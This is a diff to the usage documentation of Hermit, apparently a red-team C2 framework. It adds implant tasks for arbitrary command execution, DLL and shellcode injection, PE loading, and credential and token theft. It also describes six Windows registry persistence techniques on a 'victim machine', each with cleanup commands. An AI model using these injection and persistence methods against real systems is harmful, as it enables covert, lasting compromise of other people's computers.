@@ -7,18 +7,19 @@ Currently, the following tasks are available:
 
 ```txt
 TASK:
+  assembly        Load and execute .NET assembly.
   cat             Read contents of a file.
   cd              Change the working directory.
+  cmd             Execute arbitrary system command.
   connect         Change listener URL to connect.
   cp              Copy a file.
   creds steal     Steal credentials from various resources on the target computer
-  dll             Load DLL and inject modules into the specified process
+  dll             Load DLL and inject modules into the specified process.
   download        Download a file.
   env ls          List environment variables.
   envs            alias for 'env ls'
-  execute         Execute system command.
   group ls        List local groups.
-  groups          Alias for 'group ls'
+  groups          Alias for 'group ls'.
   history         Retrieve information from history files of applications
   ip              Print the network interface information on target computer
   jitter          Set jitter time (seconds) between requests from beacon
@@ -30,6 +31,8 @@ TASK:
   mkdir           Create a new directory.
   mv              Move a file to a destination location.
   net             Get TCP connections.
+  pe              Load and execute PE (Portable Executable) file.
+  persist         Establish persistence for implant.
   procdump        Dump process memory to a specified output file.
   ps kill         Terminate a process.
   ps ls           List processes.
@@ -42,13 +45,13 @@ TASK:
   rportfwd rm     Stop and remove listener for reverse port forwarding.
   runas           Execute a program as another user.
   screenshot      Take a screenshot on target computer.
-  shellcode       Inject shellcode into the specified process
-  sleep           Set sleep time (seconds) between requests from beacon
+  shellcode       Inject shellcode into the specified process.
+  sleep           Set sleep time (seconds) between requests from beacon.
   token revert    Revert back to the original process token.
   token steal     Steal token from the specified process and impersonate process.
   upload          Upload a file to the target computer.
   user ls         List users.
-  users           List all local users.
+  users           Alias for 'user ls'.
   whoami          Print the current user information.
 ```
 
@@ -78,6 +81,14 @@ Or you can use a normal slash (`/`) instead of a backslash:
 Hermit [agent-abcd] > cd "C:/Program Files/"
 ```
 
+## `cmd`
+
+Executes an arbitrary system command.
+
+```sh
+Hermit [agent-abcd] > cmd "dir -Force"
+```
+
 ## `connect`
 
 Changes the connected listener URL to new one.   
@@ -101,7 +112,9 @@ Hermit [agent-abcd] > cp /tmp/example.txt ./example.txt
 Injects DLL into specified process.
 
 ```sh
-Hermit [agent-abcd] > dll --pid 1234 --dll /path/to/example.dll
+# -p: target process ID
+# -f: a DLL file path
+Hermit [agent-abcd] > dll -p 1234 -f /path/to/example.dll
 ```
 
 To see running processes and check PIDs, use `ps ls` task.  
@@ -120,13 +133,11 @@ Hermit [agent-abcd] > download C:/Users/John/Desktop/example.txt /tmp/example.tx
 
 Lists environment variables in victim machine.
 
-## `execute`
+## `group`
 
-Executes system command in victim machine.
+### `group ls`, `groups`
 
-```sh
-Hermit [agent-abcd] > execute notepad.exe
-```
+Lists local groups in victim machine.
 
 ## `jitter`
 
@@ -159,6 +170,10 @@ Specify in **UTC**. And the format is such like `2025-01-01 00:00:00`.
 Hermit [agent-abcd] > killdate 2025-01-01 06:01:20
 ```
 
+## `ls`
+
+Lists files in current working directory in victim machine.
+
 ## `migrate`
 
 Migrates the implant to another process.  
@@ -170,6 +185,14 @@ Hermit [agent-abcd] > migrate 1234
 
 To see running processes and PIDs, use `ps ls` task.
 
+## `mkdir`
+
+Creates a new directory in current working directory in victim machine.
+
+```sh
+Hermit [agent-abcd] > mkdir new_dir
+```
+
 ## `mv`
 
 Move a file to specified place.
@@ -178,17 +201,101 @@ Move a file to specified place.
 Hermit [agent-abcd] > mv ./example.txt C:/Users/John/Documents/example.txt
 ```
 
+## `net`
+
+Prints open ip/ports.
+
+## `pe`
+
+Loads and executes a Portable Executable (`.exe`) file.
+
+```sh
+# -f: an executable file path
+Hermit [agent-abcd] > pe -f /path/to/example.exe
+```
+
 ## `persist`
 
 Make the implant persistence.  
-After running `persist` command, we can select the technique.  
 
 ```sh
 Hermit [agent-abcd] > persist
 ```
 
-- **registry/runkey**  
-  Add the entry (the implant file path) to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
+We can select the persistence technique in wizard.  
+
+### Technique 1: `runkey`
+
+Add an entry (the implant path) to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.  
+The implant will run every time the victim machine starts.  
+
+Cleanup:
+
+```powershell title="Windows Victim Machine"
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RandomName"
+```
+
+Replace the `RandomName` with the actual name which is randomly generated strings. To see the name, check with **Registry Editor (regedit)**.
+
+### Technique 2: `user-init-mpr-logon-script`
+
+Uses `UserInitMprLogonScript`.  
+Add an entry (the imaplant path) to `HKCU\Environment`.  
+The implant will run every time a user logs in.
+
+Cleanup:
+
+```powershell title="Windows Victim Machine"
+Remove-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript"
+```
+
+### Technique 3: `screensaver`
+
+Add an entry (the implant path) to `HKCU\Control Panel\Desktop`.  
+The implant will run after a period of user inactivity.  
+
+Cleanup:
+
+```powershell title="Windows Victim Machine"
+Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name 'ScreenSaveTimeOut'
+Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name 'SCRNSAVE.EXE'
+```
+
+### Technique 4: `default-file-extension-hijacking`
+
+Update an entry for `HKEY_CLASSES_ROOT\txtfile\shell\open\command`.  
+Overwrite the default application when clicking a `.txt` file. It's required to **Administrator** privilege.  
+
+Cleanup:
+
+```powershell title="Windows Victim Machine"
+reg add "HKEY_CLASSES_ROOT\txtfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "%SystemRoot%\system32\NOTEPAD.EXE %1"
+```
+
+### Technique 5: `ifeo`
+
+Uses **Image File Execution Options**.  
+Write entries for `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe` and `HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe`.  
+It's required to **Administrator** privilege.
+
+Cleanup:
+
+```powershell title="Windows Victim Machine"
+Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -Name 'GlobalFlag'
+Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" -Name 'ReportingMode'
+Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" -Name 'MonitorProcess'
+```
+
+### Technique 6: `winlogon`
+
+Add an entry (the implant path) to `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`.  
+The implant will run every time a user logs on. It's required to **Administrator** privilege.  
+
+Cleanup:
+
+```powershell title="Windows Victim Machine"
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe" /f
+```
 
 ## `procdump`
 
@@ -218,6 +325,10 @@ Hermit [agent-abcd] > ps kill 1234
 
 Lists all running processes.
 
+## `pwd`
+
+Prints the current working directory.
+
 ## `reg`
 
 Manages registy keys.
@@ -229,6 +340,26 @@ Retrieve registry values. For recursively, add `-r` flag.
 ```sh
 Hermit [agent-abcd] > reg query "HKLM\\SOFTWARE\\Microsoft" -r
 ```
+
+## `rm`
+
+Removes a file.
+
+```sh
+Hermit [agent-abcd] > rm example.txt
+```
+
+## `rmdir`
+
+Removes a directory.
+
+```sh
+Hermit [agent-abcd] > rmdir example_dir
+```
+
+## `rportfwd`
+
+Under development.
 
 ## `runas`
 
@@ -253,7 +384,9 @@ After successful, the captured image file is saved under `$HOME/.hermit/server/a
 Injects shellcode to specified process.
 
 ```sh
-Hermit [agent-abcd] > shellcode --pid 1234 -s /path/to/shellcode.bin
+# -p: target process ID
+# -f: a shellcode file path
+Hermit [agent-abcd] > shellcode -p 1234 -f /path/to/shellcode.bin
 ```
 
 To see running processes and PIDs, use `ps ls` task.
@@ -306,8 +439,13 @@ Lists local users.
 ## `whoami`
 
 Prints current user information on victim machine.  
-To print the privileges, add `--priv` flag.
 
 ```sh
 Hermit [agent-abcd] > whoami
+```
+
+To print the privileges, add `--priv` flag.
+
+```sh
+Hermit [agent-abcd] > whoami --priv
 ```
